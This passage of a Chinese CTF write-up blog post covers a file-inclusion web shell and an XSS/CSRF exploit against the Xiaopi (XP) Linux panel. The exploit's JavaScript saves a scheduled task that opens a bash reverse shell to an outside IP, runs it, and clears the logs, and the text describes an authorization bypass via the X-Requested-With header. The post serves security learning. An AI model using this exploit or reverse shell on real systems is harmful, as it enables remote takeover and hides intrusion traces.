+<p>相当于在当前文件夹put一个shell.php文件，那我们需要做的就是想办法包含这个htm文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679735944118-2a0d27a0-2b22-4620-ada8-f45a33ca6776.png#averageHue=%23ececeb&clientId=uc0bd696d-139f-4&from=paste&id=u6dd74b38&originHeight=975&originWidth=2571&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u1840c8e9-f30c-42dc-a2bb-9957ae71dec&title="><br>在单页文档管理位置添加一个页面，如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679735944138-3913982b-86a5-4a0f-aec0-4dca25c4e4a5.png#averageHue=%23eeeded&clientId=uc0bd696d-139f-4&from=paste&id=u5e7f2bc8&originHeight=922&originWidth=1956&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ud27a772f-7cb2-46d1-8639-62fcad8ab9a&title="><br>这样就会将test.htm输入进123.php，也算一种文件包含，那么就会产生我们的shell文件<br>接下来先访问<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679735944078-ac431888-6d2c-4343-86b0-ef4dcaaab801.png#averageHue=%23efefef&clientId=uc0bd696d-139f-4&from=paste&id=u4d34abb5&originHeight=637&originWidth=1925&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ufc6628c2-390e-4eff-bf14-8afa588f761&title="><br>然后直接在<a target="_blank" rel="noopener" href="http://4e840ed5-6e1e-48fe-99f7-44ff988664bd.node2.yuzhian.com.cn/shell.php%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%8D%B3%E5%8F%AF">http://4e840ed5-6e1e-48fe-99f7-44ff988664bd.node2.yuzhian.com.cn/shell.php执行命令即可</a><br>这里网站的根目录就是&#x2F;</p>
+<h2 id="xiaopi-SOLVED-Working-Boogipop"><a href="#xiaopi-SOLVED-Working-Boogipop" class="headerlink" title="xiaopi | SOLVED | Working - Boogipop"></a><strong>xiaopi | SOLVED | Working - Boogipop</strong></h2><p>考点：小皮最近爆出来的1day<br>Xiaopi linux管理系统存在前台RCE和后台RCE，后台RCE是基于1 click XSS实现的，前台RCE是0 click但是这一题有bot，因此选择1 click<br>首先准备一下exp.js，用来触发CSRF</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  $.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,function(data)&#123;</span><br><span class="line">    <span class="keyword">var</span> id=data.data[<span class="number">0</span>].ID;</span><br><span class="line">    $.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;</span><br><span class="line">      <span class="attr">tid</span>:id</span><br><span class="line">    &#125;,function(res2)&#123;</span><br><span class="line">        $.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;,function(res3)&#123;&#125;,<span class="string">&quot;json&quot;</span>);</span><br><span class="line">        </span><br><span class="line">      </span><br><span class="line">    &#125;,<span class="string">&quot;json&quot;</span>);</span><br><span class="line">  &#125;,<span class="string">&quot;json&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> data=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">  data.task_id=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  data.title=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">  data.exec_cycle=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">  data.week=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">  data.day=<span class="string">&quot;3&quot;</span>;</span><br><span class="line">  data.hour=<span class="string">&quot;14&quot;</span>;</span><br><span class="line">  data.minute = <span class="string">&quot;20&quot;</span>;</span><br><span class="line">  data.shell=<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/175.24.235.176/7777 &lt;&amp;1&quot;&#x27;</span>;</span><br><span class="line">  $.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,function(res)&#123;</span><br><span class="line">    <span class="title function_ invoke__">poc</span>();</span><br><span class="line">  &#125;,<span class="string">&#x27;json&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">save</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里会将反弹shell指令写进管理面板的计划任务，因此得以rce<br>还涉及一个前台绕过<br>加上附加头 X-Requested-With: XMLHttpRequest 即可直接绕过授权码，不需要知道授权码就可以看到登录界面<br>然后用户名给上XSS 的payload，起nc等待反弹shell<br>这个放在用户名处，然后验证码一定要正确，否则寄</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/29/Shiro%20_%20CommonBeanUtils%E5%88%A9%E7%94%A8%E9%93%BE/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">ShiroのCommonBeanUtils利用链</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/29/Groovy%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">Groovy反序列化利用链</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
